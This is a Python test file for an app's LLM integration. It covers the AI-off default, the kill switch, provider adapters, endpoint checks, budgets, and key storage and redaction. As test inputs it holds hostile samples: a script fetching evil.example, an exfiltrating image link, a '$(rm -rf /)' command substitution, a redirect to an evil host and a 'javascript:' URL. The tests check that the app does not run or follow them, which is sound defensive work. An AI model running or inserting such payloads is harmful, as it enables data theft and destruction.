"""The LLM port (milestone 1.1), key storage and log redaction (1.2b) and the kill switch.

Every test talks to a fake server through a mock transport: no test reaches a real server (see conftest)."""
import asyncio
import datetime as dt
import json
import logging
import threading
import time
from logging.handlers import RotatingFileHandler

import httpx
import pytest
from pydantic import BaseModel

from readhold import config, redact
from readhold.ai import (
    AIOff,
    BudgetReached,
    Cancelled,
    CouldNotGenerate,
    NoKey,
    NotSetUp,
    Port,
    ProviderError,
    TimedOut,
    endpoint_warning,
    keys,
    profiles,
)
from readhold.ai import log as ai_log
from readhold.server import DEFAULT_SETTINGS

KEY = "sk-ant-api03-" + "TESTONLYq7Zx81LmNoPqRsTuVwXyZ0123456789abcd"  # made up; built in two parts so no file holds a key shape


# ------------------------------------------------------------------ a fake model server
def ollama(text="ready", tin=7, tout=3):
    return lambda request: httpx.Response(200, json={"message": {"role": "assistant", "content": text}, "prompt_eval_count": tin, "eval_count": tout})


def openai_style(text="ready", tin=7, tout=3):
    return lambda request: httpx.Response(200, json={"choices": [{"message": {"role": "assistant", "content": text}}], "usage": {"prompt_tokens": tin, "completion_tokens": tout}})


def anthropic(text="ready", tin=7, tout=3):
    return lambda request: httpx.Response(200, json={"content": [{"type": "thinking", "thinking": ""}, {"type": "text", "text": text}], "stop_reason": "end_turn", "usage": {"input_tokens": tin, "output_tokens": tout}})


class Server:
    """Records every request, and how many were open at once."""

    def __init__(self, *replies, delay=0.0):
        self.replies = list(replies) or [ollama()]
        self.delay = delay
        self.requests: list[httpx.Request] = []
        self.active = 0
        self.peak = 0

    async def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        self.active += 1
        self.peak = max(self.peak, self.active)
        try:
            if self.delay:
                await asyncio.sleep(self.delay)
            reply = self.replies[min(len(self.requests), len(self.replies)) - 1]
            return reply(request)
        finally:
            self.active -= 1

    def body(self, i=-1) -> dict:
        return json.loads(self.requests[i].content)


LOCAL = {"ai_mode": "local", "ai_local_model": "llama3.2", "ai_local_small_model": "llama3.2:1b"}
CLOUD = {"ai_mode": "cloud", "ai_cloud_provider": "anthropic"}


def make_port(db, server, **settings):
    s = {**DEFAULT_SETTINGS, **settings}
    port = Port(db, lambda: s, transport=httpx.MockTransport(server))
    port.retry_wait = 0
    port.test_settings = s  # the tests change this dict to "change a setting"
    return port


def rows(db):
    return db.all("SELECT * FROM ai_log ORDER BY created_at, rowid")


# ------------------------------------------------------------------ off means off
def test_ai_is_off_by_default_and_then_nothing_connects(db):
    assert DEFAULT_SETTINGS["ai_mode"] == "off"
    server = Server()
    port = make_port(db, server)
    with pytest.raises(AIOff):
        port.complete("explain", "", "hello")
    assert server.requests == []
    assert rows(db) == []
    assert port._loop is None  # not even the worker thread was started


def test_with_ai_off_the_test_button_connects_to_nothing(client):
    server = Server()
    client.app.state.ai.transport = httpx.MockTransport(server)
    assert client.get("/api/settings").json()["ai_mode"] == "off"
    r = client.post("/api/ai/test", json={}).json()
    assert r["ok"] is False and r["code"] == "off"
    assert server.requests == []
    assert client.get("/api/ai/log").json()["rows"] == []


def test_the_kill_switch_stops_calls_that_are_running(client):
    server = Server(delay=5)
    port = client.app.state.ai
    port.transport = httpx.MockTransport(server)
    client.put("/api/settings", json=LOCAL)
    got: dict = {}

    def call():
        try:
            port.complete("explain", "", "hello")
        except Exception as e:  # noqa: BLE001
            got["error"] = e

    t = threading.Thread(target=call)
    t.start()
    for _ in range(200):
        if server.requests:
            break
        time.sleep(0.01)
    started = time.monotonic()
    client.put("/api/settings", json={"ai_mode": "off"})  # one switch
    t.join(2)
    assert not t.is_alive() and time.monotonic() - started < 2
    assert isinstance(got["error"], Cancelled)
    with pytest.raises(AIOff):
        port.complete("explain", "", "hello")
    assert len(server.requests) == 1


# ------------------------------------------------------------------ one port, two adapters, a settings change between them
def test_a_local_ollama_call_and_its_log_row(db):
    server = Server(ollama("Hello there.", 11, 4))
    port = make_port(db, server, **LOCAL)
    reply = port.complete("explain", "You explain.", "What is a router?")
    assert reply.text == "Hello there." and reply.data is None
    assert (reply.provider, reply.model) == ("local", "llama3.2")
    request = server.requests[0]
    assert str(request.url) == "http://localhost:11434/api/chat"
    assert "authorization" not in request.headers and "x-api-key" not in request.headers
    body = server.body()
    assert body["model"] == "llama3.2" and body["stream"] is False
    assert body["messages"] == [{"role": "system", "content": "You explain."}, {"role": "user", "content": "What is a router?"}]
    assert body["options"] == {"temperature": 0.4, "top_p": 0.95, "num_predict": profiles.load()["explain"]["max_output_tokens"]}
    assert "tools" not in body  # the model gets no tools
    (row,) = rows(db)
    assert row["id"] == reply.log_id and row["task"] == "explain" and row["provider"] == "local" and row["model"] == "llama3.2"
    assert row["prompt_version"] == "" and row["outcome"] == "ok" and row["attempts"] == 1
    assert (row["tokens_in"], row["tokens_out"]) == (11, 4) and row["latency_ms"] >= 0
    assert len(row["input_hash"]) == 64 and "What is a router?" in row["input_preview"] and row["output_preview"] == "Hello there."
    assert row["device_id"] and row["updated_at"] and row["deleted"] == 0  # the project's record rules


def test_the_small_profile_uses_the_small_model(db):
    server = Server()
    port = make_port(db, server, **LOCAL)
    port.complete("resume", "", "x")
    assert server.body()["model"] == "llama3.2:1b"
    port.test_settings["ai_local_small_model"] = ""  # none chosen: the main model does it
    port.complete("resume", "", "x")
    assert server.body()["model"] == "llama3.2"


def test_an_openai_compatible_local_server(db):
    server = Server(openai_style("Hi."))
    port = make_port(db, server, **LOCAL, ai_local_api="openai", ai_local_endpoint="http://127.0.0.1:1234/v1")
    assert port.complete("ask", "", "q").text == "Hi."
    assert str(server.requests[0].url) == "http://127.0.0.1:1234/v1/chat/completions"
    body = server.body()
    assert body["temperature"] == 0 and body["top_p"] == 1.0 and body["max_tokens"] > 0 and body["stream"] is False
    assert "options" not in body and "min_p" not in body


def test_switching_provider_is_only_a_settings_change(db):
    keys.save("anthropic", KEY)
    server = Server(ollama("local"), anthropic("cloud"), ollama("local again"))
    port = make_port(db, server, **LOCAL)
    assert port.complete("explain", "", "x").text == "local"
    port.test_settings.update(CLOUD)
    reply = port.complete("explain", "", "x")
    assert reply.text == "cloud" and reply.provider == "anthropic"
    assert server.requests[1].url.host == "api.anthropic.com" and server.requests[1].url.scheme == "https"
    port.test_settings["ai_mode"] = "local"
    assert port.complete("explain", "", "x").text == "local again"
    assert [r["provider"] for r in rows(db)] == ["local", "anthropic", "local"]


def test_the_cloud_adapter_refuses_to_run_without_a_key(db):
    server = Server(anthropic())
    port = make_port(db, server, **CLOUD)
    with pytest.raises(NoKey):
        port.complete("explain", "", "x")
    assert server.requests == []
    assert rows(db)[0]["outcome"] == "no_key"


def test_local_mode_without_a_model_asks_for_setup(db):
    server = Server()
    port = make_port(db, server, ai_mode="local")
    with pytest.raises(NotSetUp):
        port.complete("explain", "", "x")
    assert server.requests == []


def test_the_port_drops_parameters_a_provider_does_not_support(db):
    keys.save("anthropic", KEY)
    keys.save("openai", "sk-proj-" + "TESTONLY0123456789abcdefghij")
    server = Server(ollama(), anthropic(), openai_style(), openai_style())
    port = make_port(db, server, **LOCAL)
    port.complete("brainstorm", "", "x")  # this profile has min_p for local models
    assert server.body()["options"]["min_p"] == 0.05
    port.test_settings.update(CLOUD)
    port.complete("brainstorm", "", "x")
    body = server.body()
    assert server.requests[-1].headers["x-api-key"] == KEY and server.requests[-1].headers["anthropic-version"]
    assert body["model"] == "claude-opus-5-5" and body["max_tokens"] >= 1024
    assert not {"temperature", "top_p", "top_k", "min_p", "tools", "thinking"} & set(body)  # current Claude models reject sampling parameters
    port.test_settings.update(ai_cloud_provider="openai", ai_cloud_model="gpt-4.1")
    port.complete("brainstorm", "", "x")
    body = server.body()
    assert server.requests[-1].headers["authorization"].startswith("Bearer sk-proj-")
    assert body["temperature"] == 1.0 and "min_p" not in body and "max_completion_tokens" in body
    port.test_settings.update(ai_cloud_model="o4-mini")  # a reasoning model: no sampling parameters
    port.complete("brainstorm", "", "x")
    assert not {"temperature", "top_p", "min_p"} & set(server.body())


def test_an_unknown_task_is_a_programming_error(db):
    with pytest.raises(ValueError):
        make_port(db, Server(), **LOCAL).complete("no-such-task", "", "x")


# ------------------------------------------------------------------ endpoint checks
@pytest.mark.parametrize("url", ["http://localhost:11434", "http://127.0.0.1:1234/v1", "http://[::1]:8080", "https://localhost:8443"])
def test_a_local_endpoint_has_no_warning(url):
    assert endpoint_warning(url) == ""


def test_a_remote_endpoint_without_https_is_warned_about(db):
    plain = endpoint_warning("http://192.168.1.20:11434")
    assert "not encrypted" in plain and "not on this computer" in plain
    secure = endpoint_warning("https://models.example.org/v1")
    assert "not on this computer" in secure and "not encrypted" not in secure
    assert endpoint_warning("http://localhost.evil.example:11434")  # a name that only starts like localhost
    port = make_port(db, Server(), **LOCAL, ai_local_endpoint="http://192.168.1.20:11434")
    assert port.status()["warning"] == plain


@pytest.mark.parametrize("url", ["ftp://localhost/x", "file:///c:/models", "localhost:11434", "http://user:pw@localhost:11434", "http://", "javascript:alert(1)"])
def test_an_endpoint_that_is_not_a_plain_web_address_is_refused(client, url):
    assert client.put("/api/settings", json={"ai_local_endpoint": url}).status_code == 422
    assert client.get("/api/settings").json()["ai_local_endpoint"] == DEFAULT_SETTINGS["ai_local_endpoint"]


def test_ai_settings_are_checked(client):
    assert client.put("/api/settings", json={"ai_mode": "always"}).status_code == 422
    assert client.put("/api/settings", json={"ai_cloud_provider": "evil"}).status_code == 422
    assert client.put("/api/settings", json={"ai_timeout_s": 100000}).status_code == 422
    assert client.put("/api/settings", json={"ai_budget_cloud": -1}).status_code == 422
    # a key pasted into the wrong box is not stored in the database
    assert client.put("/api/settings", json={"ai_cloud_model": KEY}).status_code == 422
    assert client.put("/api/settings", json={"ai_local_endpoint": f"http://localhost:11434/?api_key={KEY}"}).status_code == 422
    ok = client.put("/api/settings", json={"ai_mode": "local", "ai_local_model": "qwen2.5:7b-instruct", "theme": "sand"})
    assert ok.status_code == 200 and ok.json()["ai_mode"] == "local"


def test_a_redirect_from_the_server_is_not_followed(db):
    server = Server(lambda r: httpx.Response(302, headers={"location": "http://evil.example/steal"}))
    port = make_port(db, server, **LOCAL)
    with pytest.raises(ProviderError):
        port.complete("explain", "", "x")
    assert len(server.requests) == 1 and server.requests[0].url.host == "localhost"


# ------------------------------------------------------------------ timeout, retry, output cap
def test_a_slow_call_times_out_and_is_not_retried(db):
    server = Server(delay=3)
    port = make_port(db, server, **LOCAL, ai_timeout_s=0.15)
    started = time.monotonic()
    with pytest.raises(TimedOut):
        port.complete("explain", "", "x")
    assert time.monotonic() - started < 1.5
    assert len(server.requests) == 1
    assert rows(db)[0]["outcome"] == "timeout"


def test_a_server_error_is_retried_once(db):
    busy = lambda r: httpx.Response(503, text="loading the model")  # noqa: E731
    server = Server(busy, ollama("second try"))
    port = make_port(db, server, **LOCAL)
    assert port.complete("explain", "", "x").text == "second try"
    assert len(server.requests) == 2 and rows(db)[0]["attempts"] == 2

    server = Server(busy)
    port = make_port(db, server, **LOCAL)
    with pytest.raises(ProviderError):
        port.complete("explain", "", "x")
    assert len(server.requests) == 2  # one retry, never more
    assert rows(db)[-1]["outcome"] == "error" and rows(db)[-1]["attempts"] == 2


def test_a_refused_key_is_not_retried(db):
    keys.save("anthropic", KEY)
    server = Server(lambda r: httpx.Response(401, json={"error": {"message": "invalid x-api-key"}}))
    port = make_port(db, server, **CLOUD)
    with pytest.raises(ProviderError) as e:
        port.complete("explain", "", "x")
    assert e.value.code == "auth" and len(server.requests) == 1


def test_a_server_that_is_not_running_reads_as_offline(db):
    def down(request):
        raise httpx.ConnectError("connection refused", request=request)

    port = make_port(db, Server(down), **LOCAL)
    with pytest.raises(ProviderError) as e:
        port.complete("explain", "", "x")
    assert e.value.code == "offline"


class Digest(BaseModel):
    summary: str
    keywords: list[str]


def test_json_is_validated_and_a_bad_answer_is_retried_once(db):
    good = json.dumps({"summary": "It routes.", "keywords": ["router"]})
    server = Server(ollama("Sure! Here you go"), ollama(f"```json\n{good}\n```"))
    port = make_port(db, server, **LOCAL)
    reply = port.complete("digest", "", "x", schema=Digest)
    assert reply.data == {"summary": "It routes.", "keywords": ["router"]}
    assert len(server.requests) == 2
    assert server.body()["format"]["properties"].keys() == {"summary", "keywords"}  # Ollama gets the schema
    assert json.loads(rows(db)[0]["checks"])["schema"] is True

    server = Server(ollama('{"summary": 5}'))
    port = make_port(db, server, **LOCAL)
    with pytest.raises(CouldNotGenerate):
        port.complete("digest", "", "x", schema=Digest)
    assert len(server.requests) == 2
    last = rows(db)[-1]
    assert last["outcome"] == "invalid" and json.loads(last["checks"])["schema"] is False


def test_the_output_length_is_capped(db):
    server = Server(ollama("word " * 100_000))
    port = make_port(db, server, **LOCAL)
    reply = port.complete("resume", "", "x")
    assert len(reply.text) <= profiles.load()["resume"]["max_output_tokens"] * 8
    assert json.loads(rows(db)[0]["checks"])["truncated"] is True


def test_a_reply_that_is_far_too_large_is_dropped(db):
    from readhold.ai import MAX_REPLY_BYTES

    server = Server(lambda r: httpx.Response(200, content=b"x" * (MAX_REPLY_BYTES + 10)))
    port = make_port(db, server, **LOCAL)
    with pytest.raises(ProviderError):
        port.complete("explain", "", "x")
    assert len(server.requests) == 1


def test_what_the_model_returns_is_only_text(db):
    """Nothing in an answer is executed, opened or followed: it comes back as the same characters."""
    nasty = '<script>fetch("http://evil.example")</script> ![x](http://evil.example/?d=1) C:\\Windows\\win.ini $(rm -rf /)'
    server = Server(ollama(nasty))
    port = make_port(db, server, **LOCAL)
    assert port.complete("explain", "", "x").text == nasty
    assert len(server.requests) == 1  # no second request to anything the answer named


# ------------------------------------------------------------------ budget, concurrency, cancel
def test_the_daily_budget_warns_at_80_percent_and_stops_at_100(db):
    keys.save("anthropic", KEY)
    server = Server(ollama("a", 30, 20))
    port = make_port(db, server, **LOCAL, ai_budget_local=100)
    assert port.complete("explain", "", "x").warning == ""  # 50 of 100
    assert port.status()["usage"] == {"used": 50, "budget": 100, "state": "ok"}
    assert "80%" in port.complete("explain", "", "x").warning  # 100 of 100
    assert port.status()["usage"]["state"] == "stop"
    with pytest.raises(BudgetReached):
        port.complete("explain", "", "x")
    assert len(server.requests) == 2  # the third call never left
    assert rows(db)[-1]["outcome"] == "budget"
    # the budget is per provider: the cloud one is untouched
    server.replies = [anthropic()]
    port.test_settings.update(CLOUD)
    assert port.complete("explain", "", "x").text == "ready"
    # clearing the history does not hand the day's budget back
    ai_log.clear(db)
    port.test_settings["ai_mode"] = "local"
    with pytest.raises(BudgetReached):
        port.complete("explain", "", "x")


def test_at_most_two_calls_run_at_once(db):
    server = Server(delay=0.15)
    port = make_port(db, server, **LOCAL)
    done: list[str] = []
    threads = [threading.Thread(target=lambda: done.append(port.complete("explain", "", "x").text)) for _ in range(6)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(10)
    assert done == ["ready"] * 6
    assert server.peak == 2


def test_a_call_can_be_cancelled(db):
    server = Server(delay=5)
    port = make_port(db, server, **LOCAL)
    got: dict = {}

    def call():
        try:
            port.complete("explain", "", "x", call_id="abc")
        except Exception as e:  # noqa: BLE001
            got["error"] = e

    t = threading.Thread(target=call)
    t.start()
    for _ in range(200):
        if server.requests:
            break
        time.sleep(0.01)
    assert port.cancel("abc") is True
    t.join(2)
    assert not t.is_alive() and isinstance(got["error"], Cancelled)
    assert rows(db)[0]["outcome"] == "cancelled"
    assert port.cancel("abc") is False  # nothing left to stop


# ------------------------------------------------------------------ keys: only in the credential store
def test_the_key_api_says_only_whether_a_key_is_set(client):
    assert client.get("/api/ai/status").json()["key_set"] is False
    r = client.put("/api/ai/key", json={"provider": "anthropic", "key": f"  {KEY}\n"})
    assert r.status_code == 200 and r.json() == {"provider": "anthropic", "key_set": True}
    assert keys.get("anthropic") == KEY
    status = client.get("/api/ai/status").json()
    assert status["key_set"] is True and KEY not in json.dumps(status)
    assert client.put("/api/ai/key", json={"provider": "evil", "key": KEY}).status_code == 422
    assert client.put("/api/ai/key", json={"provider": "anthropic", "key": "short"}).status_code == 422
    assert client.put("/api/ai/key", json={"provider": "anthropic", "key": "has spaces in the middle of it"}).status_code == 422
    assert client.delete("/api/ai/key?provider=anthropic").json() == {"provider": "anthropic", "key_set": False}
    assert keys.get("anthropic") is None
    assert client.delete("/api/ai/key?provider=anthropic").status_code == 200  # clearing twice is fine


@pytest.fixture()
def logfile(home):
    root = logging.getLogger()
    level = root.level
    config.setup_logging()
    yield home / "data" / "logs" / "readhold.log"
    for h in [h for h in root.handlers if isinstance(h, RotatingFileHandler)]:
        h.close()
        root.removeHandler(h)
    root.setLevel(level)


def test_a_key_never_reaches_the_database_the_log_an_api_response_or_the_ai_log(home, logfile, client):
    seen: list[str] = []  # every response body the app sent

    def call(method, path, **kw):
        r = client.request(method, path, **kw)
        seen.append(r.text)
        return r

    def hostile(request):  # a server that repeats the key back, in an answer and in an error
        assert request.headers["x-api-key"] == KEY  # the one place the key goes: the provider's own header
        if len(server.requests) == 1:
            return anthropic(f"Your key is {KEY}, by the way.")(request)
        return httpx.Response(400, json={"error": {"message": f"bad request for key {KEY}"}})

    server = Server(hostile)
    port = client.app.state.ai
    port.transport = httpx.MockTransport(server)
    port.retry_wait = 0
    call("PUT", "/api/ai/key", json={"provider": "anthropic", "key": KEY})
    call("PUT", "/api/settings", json=CLOUD)
    call("PUT", "/api/settings", json={"ai_cloud_model": KEY})  # refused
    assert call("POST", "/api/ai/test", json={}).json()["ok"] is True
    assert call("POST", "/api/ai/test", json={}).json()["ok"] is False
    logging.getLogger("readhold.test").error("provider said: %s", f"invalid key {KEY}")
    try:
        raise RuntimeError(f"Authorization: Bearer {KEY}")
    except RuntimeError:
        logging.getLogger("readhold.test").exception("call failed")
    for path in ("/api/ai/status", "/api/ai/log", "/api/settings", "/api/ai/profiles"):
        call("GET", path)
    call("POST", "/api/export/all")
    call("POST", "/api/backup")
    assert len(server.requests) == 2 and len(rows(client.app.state.db)) == 2

    db = client.app.state.db
    db.conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
    for h in logging.getLogger().handlers:
        h.flush()
    assert logfile.read_text("utf-8").count("[redacted]") >= 2
    needle = KEY.encode()
    files = [p for p in home.rglob("*") if p.is_file()]
    assert any(p.name == "readhold.db" for p in files) and logfile in files
    for p in files:  # the database, its backups, the export, the log, the profile file: everything the app wrote
        assert needle not in p.read_bytes(), f"the key is in {p.relative_to(home)}"
    for body in seen:
        assert KEY not in body
    for row in rows(db):
        assert KEY not in json.dumps(row)


def test_an_answer_that_repeats_the_key_comes_back_without_it(db):
    keys.save("anthropic", KEY)
    port = make_port(db, Server(anthropic(f"The key is {KEY}.")), **CLOUD)
    assert port.complete("explain", "", "x").text == "The key is [redacted]."


def test_key_shaped_text_is_removed_before_logging():
    for secret in (
        KEY,
        # made up, and built here so no file holds a string that a secret scanner would take for a real key
        "sk-proj-" + "FAKEabcdefghijklmnopqrstuvwxyz0",
        "ghp_" + "FAKEabcdefghijklmnopqrstuvwxyz012345",
        "AIza" + "SyFAKE-abcdefghijklmnopqrstuvwxyz0",
        "AKIA" + "IOSFODNN7EXAMPLE",
        "xoxb-" + "123456789012-FAKEdefghijkl",
    ):
        cleaned = redact.clean(f"calling with {secret} now")
        assert secret not in cleaned and "[redacted]" in cleaned and cleaned.startswith("calling with")
    assert "hunter2hunter2" not in redact.clean('{"password": "hunter2hunter2"}')
    assert "abc.def.ghi-jkl_mnopqrstuv" not in redact.clean("Authorization: Bearer abc.def.ghi-jkl_mnopqrstuv")
    assert "MIIEvQ" not in redact.clean("-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg\n-----END PRIVATE KEY-----")
    plain = "The router keeps the top-k blocks; see section 3.2 (page 14)."
    assert redact.clean(plain) == plain  # ordinary text is left alone
    assert redact.looks_like_key(KEY) and not redact.looks_like_key("llama3.2:1b")


def test_the_credential_store_is_the_only_place_a_key_is_kept(db):
    import keyring

    keys.save("anthropic", KEY)
    assert keyring.get_password(keys.SERVICE, "ai-key:anthropic") == KEY
    assert db.scalar("SELECT COUNT(*) FROM settings") == 0
    assert not (config.data_dir() / "ai_profiles.json").exists()
    keys.clear("anthropic")
    assert keys.get("anthropic") is None and not keys.is_set("anthropic")


def test_a_broken_credential_store_reads_as_no_key(db, monkeypatch):
    import keyring

    def broken(*a):
        raise RuntimeError("no backend")

    monkeypatch.setattr(keyring, "get_password", broken)
    assert keys.get("anthropic") is None
    with pytest.raises(NoKey):
        make_port(db, Server(anthropic()), **CLOUD).complete("explain", "", "x")


# ------------------------------------------------------------------ ai_log: retention, clearing, export
def test_the_ai_log_forgets_after_30_days(db):
    old = (dt.datetime.now(dt.timezone.utc) - dt.timedelta(days=31)).isoformat(timespec="milliseconds")
    recent = (dt.datetime.now(dt.timezone.utc) - dt.timedelta(days=29)).isoformat(timespec="milliseconds")
    ai_log.write(db, task="explain", provider="local", model="m", outcome="ok", created_at=old, updated_at=old)
    kept = ai_log.write(db, task="explain", provider="local", model="m", outcome="ok", created_at=recent, updated_at=recent)
    assert ai_log.purge(db) == 1
    assert [r["id"] for r in rows(db)] == [kept]


def test_old_rows_are_purged_when_the_app_starts(db):
    old = (dt.datetime.now(dt.timezone.utc) - dt.timedelta(days=40)).isoformat(timespec="milliseconds")
    ai_log.write(db, task="explain", provider="local", model="m", outcome="ok", created_at=old, updated_at=old)
    from readhold.server import create_app

    create_app(db, "t", {"testserver"})
    assert rows(db) == []


def test_clear_ai_history(client):
    server = Server(ollama("An answer."))
    client.app.state.ai.transport = httpx.MockTransport(server)
    client.put("/api/settings", json=LOCAL)
    assert client.post("/api/ai/test", json={}).json()["ok"] is True
    db = client.app.state.db
    old = (dt.datetime.now(dt.timezone.utc) - dt.timedelta(days=3)).isoformat(timespec="milliseconds")
    ai_log.write(db, task="explain", provider="local", model="m", outcome="ok", input_preview="old text", created_at=old, updated_at=old)
    listed = client.get("/api/ai/log").json()["rows"]
    assert len(listed) == 2 and listed[0]["output_preview"] == "An answer."
    assert client.delete("/api/ai/log").json() == {"ok": True}
    assert client.get("/api/ai/log").json()["rows"] == []
    (left,) = rows(db)  # today's row stays as a bare count for the daily budget; nothing of its content does
    assert left["deleted"] == 1 and left["input_hash"] == "" and left["input_preview"] == "" and left["output_preview"] == ""
    assert left["tokens_in"] + left["tokens_out"] > 0


def test_the_ai_log_is_not_in_the_full_export():
    """An export file is kept for good; the AI log is meant to be gone after 30 days or on "Clear AI history"."""
    from readhold.services import EXPORT_TABLES

    assert "ai_log" not in EXPORT_TABLES


def test_previews_are_short_and_carry_no_secrets(db):
    port = make_port(db, Server(ollama("ok " * 500)), **LOCAL)
    port.complete("explain", "", f"token = {KEY}\n" + "long text " * 500)
    (row,) = rows(db)
    assert len(row["input_preview"]) <= ai_log.PREVIEW and len(row["output_preview"]) <= ai_log.PREVIEW
    assert KEY not in row["input_preview"] and "[redacted]" in row["input_preview"]


# ------------------------------------------------------------------ the Test connection button
def test_the_test_button_reports_success_and_writes_a_log_row(client):
    server = Server(ollama("ready"))
    client.app.state.ai.transport = httpx.MockTransport(server)
    client.put("/api/settings", json=LOCAL)
    r = client.post("/api/ai/test", json={}).json()
    assert r["ok"] is True and r["provider"] == "local" and r["model"] == "llama3.2:1b" and r["latency_ms"] >= 0
    (row,) = client.get("/api/ai/log").json()["rows"]
    assert row["id"] == r["log_id"] and row["task"] == "test" and row["outcome"] == "ok"
    status = client.get("/api/ai/status").json()
    assert status["mode"] == "local" and status["ready"] is True and status["warning"] == "" and status["logged"] == 1


def test_the_test_button_explains_a_failure_in_words(client):
    def down(request):
        raise httpx.ConnectError("refused", request=request)

    client.app.state.ai.transport = httpx.MockTransport(Server(down))
    client.put("/api/settings", json=LOCAL)
    r = client.post("/api/ai/test", json={}).json()
    assert r["ok"] is False and r["code"] == "offline" and "running" in r["message"]
    client.put("/api/settings", json=CLOUD)
    r = client.post("/api/ai/test", json={}).json()
    assert r["ok"] is False and r["code"] == "no_key"
    assert client.post("/api/ai/cancel", json={"call_id": "nothing"}).json() == {"cancelled": False}


# ------------------------------------------------------------------ profiles
def test_the_default_profiles_follow_the_plan():
    p = profiles.load()
    assert (p["ask"]["model"], p["ask"]["temperature"], p["ask"]["top_p"]) == ("strong", 0, 1.0)
    assert (p["resume"]["model"], p["resume"]["temperature"], p["resume"]["top_p"]) == ("small", 0.2, 0.9)
    assert (p["explain"]["temperature"], p["explain"]["top_p"]) == (0.4, 0.95)
    assert (p["brainstorm"]["temperature"], p["brainstorm"]["top_p"]) == (1.0, 1.0)
    assert (p["brainstorm_critic"]["temperature"], p["organize"]["model"]) == (0, "small")
    assert {"resume", "explain", "digest", "ask", "notes", "plan", "brainstorm", "brainstorm_critic", "organize", "test"} <= set(p)
    assert all(v["max_output_tokens"] > 0 for v in p.values())


def test_profiles_are_a_config_file_you_can_edit(client):
    server = Server()
    client.app.state.ai.transport = httpx.MockTransport(server)
    client.put("/api/settings", json=LOCAL)
    r = client.put("/api/ai/profiles", json={"explain": {"temperature": 0.9, "max_output_tokens": 300}})
    assert r.status_code == 200 and r.json()["profiles"]["explain"]["temperature"] == 0.9
    saved = json.loads((config.data_dir() / "ai_profiles.json").read_text("utf-8"))
    assert saved == {"explain": {"temperature": 0.9, "max_output_tokens": 300}}  # only what differs from the defaults
    client.app.state.ai.complete("explain", "", "x")
    assert server.body()["options"] == {"temperature": 0.9, "top_p": 0.95, "num_predict": 300}
    for bad in ({"explain": {"temperature": 9}}, {"nope": {"temperature": 0.1}}, {"explain": {"model": "gpt"}}, {"explain": {"shell": "rm"}}, {"explain": {"max_output_tokens": 10**9}}):
        assert client.put("/api/ai/profiles", json=bad).status_code == 422
    assert client.get("/api/ai/profiles").json()["profiles"]["explain"]["temperature"] == 0.9
    assert client.put("/api/ai/profiles", json={}).json()["profiles"]["explain"]["temperature"] == 0.4  # back to the defaults


def test_a_damaged_profile_file_falls_back_to_the_defaults(home):
    (config.data_dir() / "ai_profiles.json").write_text("{not json", "utf-8")
    assert profiles.load()["explain"]["temperature"] == 0.4
